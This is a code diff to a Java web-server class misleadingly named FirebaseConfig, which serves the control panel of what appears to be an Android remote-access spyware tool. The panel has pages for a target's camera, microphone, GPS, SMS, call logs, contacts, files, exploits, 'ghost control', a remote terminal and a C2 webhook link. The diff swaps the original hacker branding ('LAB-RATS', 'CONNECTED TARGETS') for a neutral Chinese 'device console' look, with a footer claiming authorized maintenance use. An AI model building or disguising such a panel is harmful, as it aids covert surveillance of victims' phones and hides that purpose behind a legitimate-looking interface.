@@ -194,10 +194,11 @@ public class FirebaseConfig extends NanoHTTPD {
     public String getHeaderProxy(String uri) { return getHeader(uri); }
 
     private String getHeader(String uri) {
-        // Navigation Map
-        String homeActive = (uri == null || uri.equals("/") || uri.equals("/terminal") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
+        // Navigation Map (grouped admin sidebar, black/white theme; ids preserved)
+        String homeActive = (uri == null || uri.equals("/") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
+        String terminalActive = uri.startsWith("/terminal") ? "active" : "";
         String ghostActive = uri.startsWith("/ghost") ? "active" : "";
-        String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
+        String cameraActive = uri.startsWith("/camera") ? "active" : "";
         String gpsActive = uri.startsWith("/gps") ? "active" : "";
         String exploitsActive = uri.startsWith("/exploits") ? "active" : "";
         String filesActive = (uri.startsWith("/files") || uri.startsWith("/device/apps")) ? "active" : "";
@@ -209,47 +210,79 @@ public class FirebaseConfig extends NanoHTTPD {
         String contactsActive = uri.startsWith("/contacts") ? "active" : "";
         String hardwareActive = (uri.startsWith("/device") && !uri.contains("apps")) ? "active" : "";
 
-        // Only hide navigation on the actual login wall
         String navHtml = "";
         if (!uri.equals("/login")) {
-            navHtml = "  <div class=\"nav\">" +
-                "    <a href=\"/terminal\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
-                "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
-                "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
-                "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
-                "    <a href=\"/exploits\" id=\"nav-exploits\" class=\"" + exploitsActive + "\">Exploits</a>" +
-                "    <a href=\"/files\" id=\"nav-files\" class=\"" + filesActive + "\">Data</a>" +
-                "    <a href=\"/intel\" id=\"nav-intel\" class=\"" + intelActive + "\">Intel</a>" +
-                "    <a href=\"/sms\" id=\"nav-sms\" class=\"" + smsActive + "\">SMS</a>" +
-                "    <a href=\"/mms\" id=\"nav-mms\" class=\"" + mmsActive + "\">MMS</a>" +
-                "    <a href=\"/audio\" id=\"nav-audio\" class=\"" + audioActive + "\">Acoustics</a>" +
-                "    <a href=\"/calls\" id=\"nav-calls\" class=\"" + callsActive + "\">Comms</a>" +
-                "    <a href=\"/contacts\" id=\"nav-contacts\" class=\"" + contactsActive + "\">Contacts</a>" +
-                "    <a href=\"/device\" id=\"nav-device\" class=\"" + hardwareActive + "\">Hardware</a>" +
-                "  </div>";
+            navHtml =
+                "  <aside class=\"adm-side\">" +
+                "    <div class=\"adm-side-brand\">设备控制台</div>" +
+                "    <div id=\"enc-status\" class=\"adm-enc-status\">链路：已连接</div>" +
+                "    <nav class=\"adm-side-nav\">" +
+                "      <div class=\"adm-side-group\">总览</div>" +
+                "      <a href=\"/\" id=\"nav-home\" class=\"adm-side-link " + homeActive + "\">总览</a>" +
+                "      <div class=\"adm-side-group\">监控</div>" +
+                "      <a href=\"/camera\" id=\"nav-camera\" class=\"adm-side-link " + cameraActive + "\">摄像头</a>" +
+                "      <a href=\"/audio\" id=\"nav-audio\" class=\"adm-side-link " + audioActive + "\">录音</a>" +
+                "      <a href=\"/gps\" id=\"nav-gps\" class=\"adm-side-link " + gpsActive + "\">定位</a>" +
+                "      <div class=\"adm-side-group\">数据</div>" +
+                "      <a href=\"/files\" id=\"nav-files\" class=\"adm-side-link " + filesActive + "\">文件</a>" +
+                "      <a href=\"/sms\" id=\"nav-sms\" class=\"adm-side-link " + smsActive + "\">短信</a>" +
+                "      <a href=\"/mms\" id=\"nav-mms\" class=\"adm-side-link " + mmsActive + "\">彩信</a>" +
+                "      <a href=\"/calls\" id=\"nav-calls\" class=\"adm-side-link " + callsActive + "\">通话记录</a>" +
+                "      <a href=\"/contacts\" id=\"nav-contacts\" class=\"adm-side-link " + contactsActive + "\">通讯录</a>" +
+                "      <a href=\"/intel\" id=\"nav-intel\" class=\"adm-side-link " + intelActive + "\">情报</a>" +
+                "      <div class=\"adm-side-group\">控制</div>" +
+                "      <a href=\"/ghost\" id=\"nav-ghost\" class=\"adm-side-link " + ghostActive + "\">幽灵控制</a>" +
+                "      <a href=\"/exploits\" id=\"nav-exploits\" class=\"adm-side-link " + exploitsActive + "\">漏洞</a>" +
+                "      <a href=\"/device\" id=\"nav-device\" class=\"adm-side-link " + hardwareActive + "\">硬件</a>" +
+                "      <div class=\"adm-side-group\">工具</div>" +
+                "      <a href=\"/terminal\" id=\"nav-terminal\" class=\"adm-side-link " + terminalActive + "\">远程终端</a>" +
+                "    </nav>" +
+                "    <a class=\"adm-btn adm-side-back\" href=\"" + c2BackUrl() + "\" target=\"_blank\">返回控制台</a>" +
+                "  </aside>" +
+                "  <main class=\"adm-main\">";
         }
 
-        String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
-        if (c2Url == null || c2Url.trim().isEmpty()) c2Url = "/c2-dashboard";
-        String renderBackBar = isRenderWebhook() ? 
-            "<div class=\"c2-top-bar\" style=\"display: flex; justify-content: flex-start; align-items: center; width: 100%; padding: 12px 0 6px 0;\"><a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; CONNECTED TARGETS</a></div>" : "";
-
         return "<!DOCTYPE html>" +
-            "<html lang=\"en\">" +
+            "<html lang=\"zh-CN\">" +
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
-            "<title>LAB-RATS | CORE</title>" +
-            "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
+            "<title>设备控制台</title>" +
+            "<link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap\" rel=\"stylesheet\">" +
             "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
-            "<style>.nav a.active, .bottom-nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } .bottom-nav { display: flex; justify-content: center; gap: 6px; flex-wrap: wrap; width: 100%; margin-top: 20px; margin-bottom: 15px; padding: 10px 0; } .bottom-nav a { padding: 6px 10px; border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 8px; color: #00f2ff; text-decoration: none; font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 0.62rem; background: rgba(0, 242, 255, 0.05); transition: all 0.25s ease-in-out; letter-spacing: 0.5px; white-space: nowrap; display: inline-flex; align-items: center; justify-content: center; min-height: 32px; } .bottom-nav a:hover, .bottom-nav a:active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 20px #00f2ff; } .render-c2-back-btn { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(0, 242, 255, 0.08); border: 1px solid rgba(0, 242, 255, 0.4); border-radius: 10px; color: #00f2ff !important; text-decoration: none !important; font-family: 'Orbitron', sans-serif; font-size: 0.78rem; font-weight: 700; letter-spacing: 1px; transition: all 0.3s; box-shadow: 0 0 18px rgba(0, 242, 255, 0.2); } .render-c2-back-btn:hover { background: #00f2ff !important; color: #000 !important; box-shadow: 0 0 30px #00f2ff; transform: scale(1.04); } @media (max-width: 768px) { .bottom-nav { gap: 8px 6px !important; padding: 12px 4px !important; margin-top: 15px !important; } .bottom-nav a { padding: 7px 11px !important; font-size: 0.65rem !important; border-radius: 8px !important; min-height: 36px !important; flex: 0 1 auto !important; } .render-c2-back-btn { padding: 7px 13px; font-size: 0.70rem; border-radius: 8px; } } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
+            "<style>" +
+            "body { margin: 0; background: #0a0a0b; color: #e6e6e6; font-family: 'Inter', 'Noto Sans SC', sans-serif; }" +
+            ".adm-layout { display: flex; min-height: 100vh; }" +
+            ".adm-side { width: 232px; flex-shrink: 0; background: #101113; border-right: 1px solid #232427; padding: 18px 12px 14px 12px; display: flex; flex-direction: column; position: sticky; top: 0; height: 100vh; box-sizing: border-box; overflow-y: auto; }" +
+            ".adm-side-brand { font-size: 17px; font-weight: 700; color: #ffffff; padding: 2px 10px 10px 10px; letter-spacing: 0.5px; }" +
+            ".adm-enc-status { font-size: 11px; color: #9aa0a6; padding: 0 10px 12px 10px; border-bottom: 1px solid #232427; margin-bottom: 10px; }" +
+            ".adm-side-nav { display: flex; flex-direction: column; gap: 2px; flex: 1; }" +
+            ".adm-side-group { font-size: 11px; color: #6d7278; text-transform: uppercase; letter-spacing: 1px; padding: 12px 10px 4px 10px; }" +
+            ".adm-side-link { display: block; padding: 7px 10px; font-size: 13px; color: #c8c8c8; text-decoration: none; border-radius: 6px; }" +
+            ".adm-side-link:hover { background: #1a1b1e; color: #ffffff; }" +
+            ".adm-side-link.active { background: #ffffff; color: #000000; font-weight: 600; }" +
+            ".adm-side-back { margin-top: 12px; text-align: center; }" +
+            ".adm-btn { display: inline-block; padding: 8px 14px; background: #ffffff; color: #000000; font-size: 13px; font-weight: 600; text-decoration: none; border-radius: 6px; border: 1px solid #ffffff; }" +
+            ".adm-btn:hover { background: #d9d9d9; }" +
+            ".adm-main { flex: 1; padding: 22px 26px; box-sizing: border-box; max-width: 1180px; }" +
+            ".adm-card { background: #141517; border: 1px solid #232427; border-radius: 10px; padding: 18px 20px; margin-bottom: 18px; }" +
+            ".adm-card h2, .adm-card h3 { color: #ffffff; font-size: 15px; margin: 0 0 12px 0; font-weight: 600; }" +
+            ".adm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; }" +
+            ".adm-stat { background: #141517; border: 1px solid #232427; border-radius: 10px; padding: 14px 16px; }" +
+            ".adm-stat .k { font-size: 12px; color: #8b9096; margin-bottom: 6px; }" +
+            ".adm-stat .v { font-size: 15px; color: #ffffff; font-weight: 600; word-break: break-all; }" +
+            "input[type=text], input[type=password], textarea, select { background: #0c0d0f; border: 1px solid #2c2d31; color: #e6e6e6; border-radius: 6px; padding: 8px 10px; font-size: 13px; font-family: 'Inter', 'Noto Sans SC', monospace; }" +
+            "@media (max-width: 860px) { .adm-layout { flex-direction: column; } .adm-side { width: 100%; height: auto; position: static; border-right: none; border-bottom: 1px solid #232427; } .adm-side-nav { flex-direction: row; flex-wrap: wrap; } .adm-side-group { width: 100%; } }" +
+            "</style>" +
             "</head>" +
             "<body>" +
-            "<div class=\"container\">" + renderBackBar +
-            "  <div class=\"header\" style=\"padding: 5px 0 0 0 !important; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
-            "    <img src=\"/c2/header_dashboard.png?v=" + System.currentTimeMillis() + "\" style=\"width: 65%; max-width: 798px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: none !important; object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
-            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
-            "  </div>" + navHtml;
+            "<div class=\"adm-layout\">" + navHtml;
+    }
+
+    private String c2BackUrl() {
+        String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        if (c2Url == null || c2Url.trim().isEmpty()) return "#";
+        return c2Url;
     }
 
     public static boolean isRenderWebhook() {
@@ -260,69 +293,42 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     public String getFooter() {
+        // Audio player and script hooks preserved; closes the adm-layout skeleton.
         return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
-                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 35px; margin-bottom: 25px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 20px;\">" +
-                "  <div class=\"bottom-nav\" style=\"margin-top: 0; margin-bottom: 15px; padding: 0;\">" +
-                "    <a href=\"/terminal\" class=\"bottom-nav-link\">Terminal</a>" +
-                "    <a href=\"/ghost\" class=\"bottom-nav-link\">Ghost</a>" +
-                "    <a href=\"/camera\" class=\"bottom-nav-link\">Optics</a>" +
-                "    <a href=\"/gps\" class=\"bottom-nav-link\">Locate</a>" +
-                "    <a href=\"/exploits\" class=\"bottom-nav-link\">Exploits</a>" +
-                "    <a href=\"/files\" class=\"bottom-nav-link\">Data</a>" +
-                "    <a href=\"/intel\" class=\"bottom-nav-link\">Intel</a>" +
-                "    <a href=\"/sms\" class=\"bottom-nav-link\">SMS</a>" +
-                "    <a href=\"/mms\" class=\"bottom-nav-link\">MMS</a>" +
-                "    <a href=\"/audio\" class=\"bottom-nav-link\">Acoustics</a>" +
-                "    <a href=\"/calls\" class=\"bottom-nav-link\">Comms</a>" +
-                "    <a href=\"/contacts\" class=\"bottom-nav-link\">Contacts</a>" +
-                "    <a href=\"/device\" class=\"bottom-nav-link\">Hardware</a>" +
-                "  </div>" +
-                "  <div style=\"border-top: 1px solid rgba(0, 242, 255, 0.15); padding-top: 15px;\">" +
-                "    &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
-                "  </div>" +
-                "</div>" +
+                "  </main>" +
                 "</div>" +
                 "<script src=\"/c2/script.js?v=" + System.currentTimeMillis() + "\"></script>" +
                 "</body>" +
                 "</html>";
     }
 
-    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGIN</title>" +
+    private static final String LOGIN_HTML = "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\">" +
+            "<title>设备控制台 · 登录</title>" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
-            "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
+            "<link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            ".login-centering-wrapper { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), url(\"data:image/svg+xml,%3Csvg width='400' height='400' viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 40h400M0 80h400M0 120h400M0 160h400M0 200h400M0 240h400M0 280h400M0 320h400M0 360h400 M40 0v400M80 0v400M120 0v400M160 0v400M200 0v400M240 0v400M280 0v400M320 0v400M360 0v400' stroke='%2300f2ff' stroke-width='0.3' stroke-opacity='0.03'/%3E%3Crect x='150' y='150' width='100' height='100' rx='8' fill='%23030f14' stroke='%2300f2ff' stroke-width='1.2' stroke-opacity='0.22'/%3E%3Crect x='168' y='168' width='64' height='64' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.18'/%3E%3Ccircle cx='162' cy='162' r='2' fill='%2300f2ff' fill-opacity='0.35'/%3E%3Cpath d='M165 150v-12M180 150v-12M195 150v-12M210 150v-12M225 150v-12 M165 250v12M180 250v12M195 250v12M210 250v12M225 250v12 M150 165h-12M150 180h-12M150 195h-12M150 210h-12M150 225h-12 M250 165h12M250 180h12M250 195h12M250 210h12M250 225h12' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.25'/%3E%3Crect x='30' y='30' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M40 30v-8M55 30v-8M70 30v-8 M40 80v8M55 80v8M70 80v8 M30 40h-8M30 55h-8M30 70h-8 M80 40h8M80 55h8M80 70h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Crect x='320' y='320' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M330 320v-8M345 320v-8M360 320v-8 M330 370v8M345 370v8M360 370v8 M320 330h-8M320 345h-8M320 360h-8 M370 330h8M370 345h8M370 360h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Cpath d='M165 138V80L135 50H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M180 138V95L150 65H10' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='8,4'/%3E%3Cpath d='M195 138V70L225 40H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 138V100L250 60H380' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11'/%3E%3Cpath d='M165 262V320L125 360H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M195 262V310L235 350H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 262V335L260 385H390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='10,5'/%3E%3Cpath d='M138 165H80L50 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M138 195H70L30 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 165H320L350 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 195H330L370 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 210H340L380 250V390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='6,3'/%3E%3Crect x='125' y='46' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='235' y='36' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='340' y='125' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='44' y='225' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='115' y='354' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Ccircle cx='135' cy='50' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='135' cy='50' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='225' cy='40' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='225' cy='40' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='350' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='350' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='50' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='50' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='125' cy='360' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='125' cy='360' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='235' cy='350' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='235' cy='350' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='370' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='370' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='30' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='30' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3C/svg%3E\"); background-size: 100% 100%, 100% 100%, 100% 100%, 400px 400px; background-position: center, center, center, 0 0; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
-            ".login-card { background: rgba(15,15,25,0.65); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); border: 1px solid #00f2ff; padding: 25px 20px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
-            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 15px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
-            "@media (max-width: 480px) {" +
-            "  .login-card { padding: 20px 15px; }" +
-            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 12px; }" +
-            "  input { padding: 12px !important; font-size: 14px !important; margin-bottom: 15px !important; }" +
-            "  button { padding: 12px !important; font-size: 14px !important; }" +
-            "  .login-card img { width: 220px !important; height: 220px !important; margin-bottom: 10px !important; }" +
-            "}" +
-            "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
-            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 18px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
-            "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
-            "button { background: #00f2ff; border: none; color: #050505; padding: 14px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
-            "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
-            ".login-card img { transition: all 0.5s; margin-bottom: 10px; background: transparent !important; border: none !important; box-shadow: none !important; border-radius: 0 !important; }" +
+            "body { background: #0a0a0b; color: #e6e6e6; font-family: 'Inter', 'Noto Sans SC', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 15px; }" +
+            ".adm-login-card { background: #141517; border: 1px solid #232427; border-radius: 12px; padding: 34px 28px; text-align: center; width: 100%; max-width: 400px; }" +
+            ".adm-login-title { font-size: 20px; font-weight: 700; color: #ffffff; margin-bottom: 8px; }" +
+            ".adm-login-sub { font-size: 13px; color: #9aa0a6; margin-bottom: 24px; }" +
+            "form { display: flex; flex-direction: column; gap: 14px; width: 100%; }" +
+            "input { background: #0c0d0f; border: 1px solid #2c2d31; color: #ffffff; padding: 12px 14px; width: 100%; border-radius: 8px; outline: none; text-align: center; font-size: 15px; font-family: 'Inter', 'Noto Sans SC', sans-serif; }" +
+            "input:focus { border-color: #ffffff; }" +
+            "button { background: #ffffff; border: 1px solid #ffffff; color: #000000; padding: 12px 14px; cursor: pointer; border-radius: 8px; font-size: 15px; font-weight: 600; font-family: 'Inter', 'Noto Sans SC', sans-serif; width: 100%; }" +
+            "button:hover { background: #d9d9d9; }" +
+            ".adm-login-foot { font-size: 11px; color: #5f6368; margin-top: 18px; }" +
             "</style></head><body>" +
-            "<div class=\"login-centering-wrapper\">" +
-            "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=150\" style=\"width: 260px; height: 260px; background: transparent !important; border: none !important; box-shadow: none !important; outline: none !important; margin: 0 auto 10px auto; display: block;\">" +
-            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
-            "<div style=\"font-size:0.95rem; opacity:0.6; margin-top: 4px; margin-bottom: 18px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.6.0</div>" +
-                        "<form id=\"login-form\" method=\"POST\" action=\"/login\" onsubmit=\"handleLogin(event)\">" +
-            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
-            "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
+            "<div class=\"adm-login-card\">" +
+            "<div class=\"adm-login-title\">设备控制台</div>" +
+            "<div class=\"adm-login-sub\">请输入访问密钥</div>" +
+            "<form id=\"login-form\" method=\"POST\" action=\"/login\" onsubmit=\"handleLogin(event)\">" +
+            "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"访问密钥\" autofocus>" +
+            "<button type=\"submit\" id=\"uplink-btn\">进入控制台</button>" +
             "</form>" +
-            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 20px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
-            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
+            "<div class=\"adm-login-foot\">仅限授权设备维护使用</div>" +
             "</div>" +
-            "</div>" +
-            "</div>" +
+            "<div id=\"status-header\" style=\"display:none;\">RESTRICTED_ACCESS</div>" +
             "<script src=\"/c2/script.js\"></script></body></html>";
 
     private static final String LOGOUT_HTML = "<!DOCTYPE html><html><head><title>LAB-RATS | LOGOUT</title>" +
